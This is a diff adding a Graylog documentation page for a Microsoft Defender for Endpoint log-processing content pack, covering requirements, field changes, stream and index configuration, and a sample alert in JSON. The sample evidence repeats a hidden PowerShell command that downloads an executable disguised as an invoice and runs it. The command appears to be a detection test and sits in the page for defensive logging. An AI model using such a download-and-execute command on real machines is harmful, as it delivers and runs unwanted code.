@@ -1,0 +1,124 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<html xmlns:MadCap="http://www.madcapsoftware.com/Schemas/MadCap.xsd">
+    <head>
+        <link href="../Resources/TableStyles/Alternate-Row-Color.css" rel="stylesheet" MadCap:stylesheetType="table" />
+    </head>
+    <body>
+        <h1>Microsoft Defender for Endpoint Content Pack</h1>
+        <p>Microsoft Defender for Endpoint is an industry-leading, cloud-powered endpoint security solution that helps to secure against ransomware, file-less malware, and other sophisticated attacks on Windows, macOS, Linux, Android, and iOS.</p>
+        <h2>Requirement(s)</h2>
+        <ul>
+            <li>
+                <p>Microsoft Defender for Endpoint Plan 1 or Plan 2.</p>
+            </li>
+        </ul>
+        <ul>
+            <li>
+                <p>Graylog Server with a valid enterprise license.</p>
+            </li>
+        </ul>
+        <h2>Graylog Server Requirement(s)</h2>
+        <ul>
+            <li>
+                <p>This spotlight requires a more recent version of Graylog than the other spotlights due to a change in how some extraction functions work. Fields will be improperly processed if using a version of Graylog Server earlier than version 5.0.</p>
+            </li>
+        </ul>
+        <ul>
+            <li>
+                <p>With the release of Illuminate 4.0 and Graylog 5.2, the <i>Microsoft Defender for Endpoint</i> input has changed. </p>
+                <ul style="list-style-type: circle;">
+                    <li>
+                        <p><code class="linecode">full_message</code> was removed and is now <code class="linecode">message</code></p>
+                    </li>
+                    <li>
+                        <p>Removed <code class="linecode">alert_signature</code>, <code class="linecode">alert_signature_id</code>, <code class="linecode">event_start</code>, and <code class="linecode">event_end</code> fields</p>
+                    </li>
+                    <li>
+                        <p>Added <code class="linecode">event_source_product</code></p>
+                    </li>
+                    <li>
+                        <p>Configured <code class="linecode">source</code> as <code class="linecode">detectionSource</code></p>
+                    </li>
+                </ul>
+                <p>Any existing configured processing of this <span style="color: #000000;">content will change and should be accounted for.</span></p>
+            </li>
+        </ul>
+        <h2>Stream Configuration</h2>
+        <p>This technology pack includes one stream:</p>
+        <p>“Illuminate:Microsoft Defender for Endpoint Messages”</p>
+        <p>
+            <section class="infoBox">
+                <div class="title" style="font-weight: normal;"><b>Hint</b>:&#160;If this stream does not exist prior to the activation of this pack then it will be created and configured to route messages to this stream and the associated index set. There should not be any stream rules configured for this stream. </div>
+            </section>
+        </p>
+        <h2>Index Set Configuration</h2>
+        <p>This technology pack includes one index set definition:</p>
+        <p>“Microsoft Defender for Endpoint Logs”</p>
+        <p>
+            <section class="infoBox">
+                <div class="title" style="font-weight: normal;"><b>Hint</b>:&#160;If this index set is already defined, then nothing will be changed. If this index set does not exist, then it will be created with retention settings of a daily rotation and 90 days of retention. These settings can be adjusted as required after installation. </div>
+            </section>
+        </p>
+        <h2>Log Format Examples<br /><br /></h2>
+        <p><code class="linecode">{"id":"da20708b1e-8554-4ec8-b59c-925c4663aa3a_1","incidentId":2,"investigationId":null,"assignedTo":null,"severity":"Medium","status":"New","classification":null,"determination":null,"investigationState":"UnsupportedAlertType","detectionSource":"WindowsDefenderAtp","detectorId":"7f1c3609-a3ff-40e2-995b-c01770161d68","category":"Execution","threatFamilyName":null,"title":"Suspicious PowerShell command line","description":"A suspicious PowerShell activity was observed on the machine. \nThis behavior may indicate that PowerShell was used during installation, exploration, or in some cases in lateral movement activities which are used by attackers to invoke modules, download external payloads, or get more information about the system. Attackers usually use PowerShell to bypass security protection mechanisms by executing their payload in memory without touching the disk and leaving any trace.","alertCreationTime":"2023-04-06T10:41:43.691043Z","firstEventTime":"2023-04-06T10:39:00.7407597Z","lastEventTime":"2023-04-06T10:42:49.3567967Z","lastUpdateTime":"2023-04-06T10:45:41.5166667Z","resolvedTime":null,"machineId":"31328158e55872c03a1b5ec4c96744cbb82c8f4b","computerDnsName":"win-tfb8l7bi77h","rbacGroupName":"UnassignedGroup","aadTenantId":"df620235-50d7-4400-bb7e-3b112e9b1ff4","threatName":null,"mitreTechniques":["T1059.001","T1105","T1140","T1216","T1218","T1218.003"],"relatedUser":{"userName":"Administrator","domainName":"WIN-TFB8L7BI77H"},"loggedOnUsers":[{"accountName":"testuser","domainName":"DESKTOP-IIQVPJ7"}],"comments":[{"comment":"test comment for docs","createdBy":"secop123@contoso.com","createdTime":"2020-07-21T01:00:37.8404534Z"}],"evidence":[{"entityType":"Process","evidenceCreationTime":"2023-04-06T10:45:41.51Z","sha1":"6cbce4a295c163791b60fc23d285e6d84f28ee4c","sha256":"de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c","fileName":"powershell.exe","filePath":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0","processId":10520,"processCommandLine":"powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= silentlycontinue;(New-Object System.Net.WebClient).DownloadFile(http://127.0.0.1/1.exe, C:\\test-WDATP-test\\invoice.exe);Start-Process C:\\test-WDATP-test\\invoice.exe","processCreationTime":"2023-04-06T10:42:49.2635644Z","parentProcessId":5212,"parentProcessCreationTime":"2023-04-06T10:40:44.9749107Z","parentProcessFileName":"cmd.exe","parentProcessFilePath":"C:\\Windows\\System32","ipAddress":null,"url":null,"registryKey":null,"registryHive":null,"registryValueType":null,"registryValue":null,"registryValueName":null,"accountName":"Administrator","domainName":"WIN-TFB8L7BI77H","userSid":"S-1-5-21-3669279935-616031708-4259075843-500","aadUserId":null,"userPrincipalName":null,"detectionStatus":"Detected"},{"entityType":"File","evidenceCreationTime":"2021-01-26T20:33:58.42Z","sha1":"8563f95b2f8a284fc99da44500cd51a77c1ff36c","sha256":"dc0ade0c95d6db98882bc8fa6707e64353cd6f7767ff48d6a81a6c2aef21c608","fileName":"suspicious.dll","filePath":"c:\\temp","processId":null,"processCommandLine":null,"processCreationTime":null,"parentProcessId":null,"parentProcessCreationTime":null,"parentProcessFileName":null,"parentProcessFilePath":null,"ipAddress":null,"url":null,"registryKey":null,"registryHive":null,"registryValueType":null,"registryValue":null,"accountName":null,"domainName":null,"userSid":null,"aadUserId":null,"userPrincipalName":null,"detectionStatus":"Detected"},{"entityType":"Process","evidenceCreationTime":"2023-04-06T10:41:44.03Z","sha1":"6cbce4a295c163791b60fc23d285e6d84f28ee4c","sha256":"de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c","fileName":"powershell.exe","filePath":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0","processId":10300,"processCommandLine":"powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= silentlycontinue;(New-Object System.Net.WebClient).DownloadFile(http://127.0.0.1/1.exe, C:\\test-WDATP-test\\invoice.exe);Start-Process C:\\test-WDATP-test\\invoice.exe","processCreationTime":"2023-04-06T10:39:00.4695054Z","parentProcessId":884,"parentProcessCreationTime":"2023-04-06T10:38:58.4494255Z","parentProcessFileName":"cmd.exe","parentProcessFilePath":"C:\\Windows\\System32","ipAddress":null,"url":null,"registryKey":null,"registryHive":null,"registryValueType":null,"registryValue":null,"registryValueName":null,"accountName":"Administrator","domainName":"WIN-TFB8L7BI77H","userSid":"S-1-5-21-3669279935-616031708-4259075843-500","aadUserId":null,"userPrincipalName":null,"detectionStatus":"Detected"},{"entityType":"User","evidenceCreationTime":"2023-04-06T10:41:43.81Z","sha1":null,"sha256":null,"fileName":null,"filePath":null,"processId":null,"processCommandLine":null,"processCreationTime":null,"parentProcessId":null,"parentProcessCreationTime":null,"parentProcessFileName":null,"parentProcessFilePath":null,"ipAddress":null,"url":null,"registryKey":null,"registryHive":null,"registryValueType":null,"registryValue":null,"registryValueName":null,"accountName":"Administrator","domainName":"WIN-TFB8L7BI77H","userSid":"S-1-5-21-3669279935-616031708-4259075843-500","aadUserId":null,"userPrincipalName":null,"detectionStatus":null},{"entityType":"Ip","evidenceCreationTime":"2023-04-06T10:41:43.81Z","sha1":null,"sha256":null,"fileName":null,"filePath":null,"processId":null,"processCommandLine":null,"processCreationTime":null,"parentProcessId":null,"parentProcessCreationTime":null,"parentProcessFileName":null,"parentProcessFilePath":null,"ipAddress":"10.10.10.173","url":null,"registryKey":null,"registryHive":null,"registryValueType":null,"registryValue":null,"registryValueName":null,"accountName":null,"domainName":null,"userSid":null,"aadUserId":null,"userPrincipalName":null,"detectionStatus":null},{"entityType":"Process","evidenceCreationTime":"2023-04-06T10:41:43.81Z","sha1":"6cbce4a295c163791b60fc23d285e6d84f28ee4c","sha256":"de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c","fileName":"powershell.exe","filePath":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0","processId":10748,"processCommandLine":"powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= silentlycontinue;(New-Object System.Net.WebClient).DownloadFile(http://127.0.0.1/1.exe, C:\\test-WDATP-test\\invoice.exe);Start-Process C:\\test-WDATP-test\\invoice.exe","processCreationTime":"2023-04-06T10:39:14.8653703Z","parentProcessId":10644,"parentProcessCreationTime":"2023-04-06T10:39:11.5147433Z","parentProcessFileName":"cmd.exe","parentProcessFilePath":"C:\\Windows\\System32","ipAddress":null,"url":null,"registryKey":null,"registryHive":null,"registryValueType":null,"registryValue":null,"registryValueName":null,"accountName":"Administrator","domainName":"WIN-TFB8L7BI77H","userSid":"S-1-5-21-3669279935-616031708-4259075843-500","aadUserId":null,"userPrincipalName":null,"detectionStatus":"Detected"}],"domains":[]}</code>
+        </p>
+        <h2>Microsoft Defender for Endpoint Logging</h2>
+        <p style="text-align: justify;">Microsoft Defender for Endpoint utilizes the Graylog Microsoft Defender for Endpoint input that ingests alert logs in JSON format (as shown above). Documentation detailing the configuration of this input can be found <a href="https://go2docs.graylog.org/5-2/getting_in_log_data/microsoft_defender_for_endpoint_input.html">here</a>.</p>
+        <p>Please note that Illuminate processes nested arrays in a specific manner. For each evidence <code class="linecode">entityType</code> (Process, User, IP, File, URL), Illuminate will only process one result per <code class="linecode">entityType</code>. However, you can still access additional results in the <code class="linecode">evidence_array</code> and GIM-specific fields (such as <code class="linecode">user_name</code>, <code class="linecode">file_name</code>, <code class="linecode">file_path</code>, etc.).</p>
+        <h2>What is Provided</h2>
+        <ul>
+            <li>
+                <p>Rules to normalize and enrich Microsoft Defender for Endpoint log messages.</p>
+            </li>
+        </ul>
+        <h3>Microsoft Defender for Endpoint Log Message Processing</h3>
+        <p>The Illuminate processing of Microsoft Defender for Endpoint log messages provides the following:</p>
+        <ul>
+            <li>
+                <p>Field extraction, normalization and message enrichment for Microsoft Defender for Endpoint log messages</p>
+            </li>
+        </ul>
+        <ul>
+            <li>
+                <p>GIM Categorization of the following messages:</p>
+            </li>
+        </ul>
+        <table style="mc-table-style: url('../Resources/TableStyles/Alternate-Row-Color.css');width: 884px;" class="TableStyle-Alternate-Row-Color" cellspacing="21">
+            <col style="width: 282px;" class="TableStyle-Alternate-Row-Color-Column-Column1" />
+            <col style="width: 315px;" class="TableStyle-Alternate-Row-Color-Column-Column1" />
+            <col style="width: 287px;" class="TableStyle-Alternate-Row-Color-Column-Column1" />
+            <thead>
+                <tr class="TableStyle-Alternate-Row-Color-Head-Header1">
+                    <th class="TableStyle-Alternate-Row-Color-HeadE-Column1-Header1">Log Type</th>
+                    <th class="TableStyle-Alternate-Row-Color-HeadE-Column1-Header1">GIM Category</th>
+                    <th class="TableStyle-Alternate-Row-Color-HeadD-Column1-Header1">GIM Subcategory
+</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr class="TableStyle-Alternate-Row-Color-Body-Body1">
+                    <td class="TableStyle-Alternate-Row-Color-BodyB-Column1-Body1" style="text-align: left;">alerts</td>
+                    <td class="TableStyle-Alternate-Row-Color-BodyB-Column1-Body1">alerts</td>
+                    <td class="TableStyle-Alternate-Row-Color-BodyA-Column1-Body1">alert.default</td>
+                </tr>
+            </tbody>
+        </table>
+        <h2>Microsoft Defender for Endpoint Spotlight Content Pack</h2>
+        <ul>
+            <li>
+                <p>Dashboard: Illuminate:Microsoft Defender for Endpoint Overview</p>
+            </li>
+        </ul>
+        <p>
+            <img src="../Resources/Images/Microsoft Defender for Endpoint/Endpoint Overview.png" />
+        </p>
+        <ul>
+            <li>
+                <p>Saved search: MS Defender for Endpoint User Alert Viewer</p>
+            </li>
+        </ul>
+        <p>
+            <img src="../Resources/Images/Microsoft Defender for Endpoint/User Alert Viewer.png" />
+        </p>
+    </body>
+</html>
